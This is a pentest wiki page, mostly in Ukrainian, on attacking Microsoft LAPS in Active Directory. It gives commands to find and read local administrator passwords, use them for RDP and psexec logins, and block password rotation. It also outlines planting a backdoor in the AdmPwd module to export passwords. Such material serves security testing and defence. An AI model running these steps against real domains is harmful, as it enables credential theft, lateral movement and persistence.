# LAPS

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Основна інформація

Local Administrator Password Solution (LAPS) - це інструмент, що використовується для управління системою, де **паролі адміністратора**, які є **унікальними, випадковими та часто змінюються**, застосовуються до комп'ютерів, приєднаних до домену. Ці паролі зберігаються безпечно в Active Directory і доступні лише користувачам, яким надано дозвіл через списки контролю доступу (ACL). Безпека передачі паролів від клієнта до сервера забезпечується за допомогою **Kerberos версії 5** та **Advanced Encryption Standard (AES)**.

У комп'ютерних об'єктах домену реалізація LAPS призводить до додавання двох нових атрибутів: **`ms-mcs-AdmPwd`** та **`ms-mcs-AdmPwdExpirationTime`**. Ці атрибути зберігають **пароль адміністратора у відкритому вигляді** та **його час закінчення терміну дії** відповідно.

### Перевірте, чи активовано
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS Password Access

Ви можете **завантажити сирий LAPS політику** з `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, а потім використати **`Parse-PolFile`** з пакету [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser), щоб перетворити цей файл у формат, зрозумілий людині.

Більш того, **рідні LAPS PowerShell cmdlets** можуть бути використані, якщо вони встановлені на машині, до якої ми маємо доступ:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** також можна використовувати, щоб дізнатися **хто може читати пароль і прочитати його**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) полегшує перерахунок LAPS за допомогою кількох функцій.\
Одна з них - це парсинг **`ExtendedRights`** для **всіх комп'ютерів з увімкненим LAPS.** Це покаже **групи**, які спеціально **делеговані для читання паролів LAPS**, які часто є користувачами в захищених групах.\
**Обліковий запис**, який **долучив комп'ютер** до домену, отримує `All Extended Rights` над цим хостом, і це право надає **обліковому запису** можливість **читати паролі**. Перерахунок може показати обліковий запис користувача, який може читати пароль LAPS на хості. Це може допомогти нам **націлити конкретних користувачів AD**, які можуть читати паролі LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Витягування паролів LAPS за допомогою Crackmapexec**

Якщо немає доступу до PowerShell, ви можете зловживати цим привілеєм віддалено через LDAP, використовуючи
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Це виведе всі паролі, які користувач може прочитати, що дозволить вам отримати кращу позицію з іншим користувачем.

## ** Використання пароля LAPS **
```
xfreerdp /v:192.168.1.1:3389  /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## **LAPS Persistence**

### **Дата закінчення терміну дії**

Після отримання прав адміністратора, можна **отримати паролі** та **запобігти** оновленню пароля машини, **встановивши дату закінчення терміну дії в майбутнє**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
> [!WARNING]
> Пароль все ще буде скинуто, якщо **адміністратор** використовує **`Reset-AdmPwdPassword`** cmdlet; або якщо **Не дозволяти час закінчення терміну дії пароля, що перевищує вимоги політики** увімкнено в GPO LAPS.

### Задня дверцята

Оригінальний вихідний код для LAPS можна знайти [тут](https://github.com/GreyCorbel/admpwd), тому можливо вставити задню дверцята в код (всередині методу `Get-AdmPwdPassword` в `Main/AdmPwd.PS/Main.cs`, наприклад), яка якимось чином **експортує нові паролі або зберігає їх десь**.

Потім просто скомпілюйте новий `AdmPwd.PS.dll` і завантажте його на машину в `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (і змініть час модифікації).

## Посилання

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
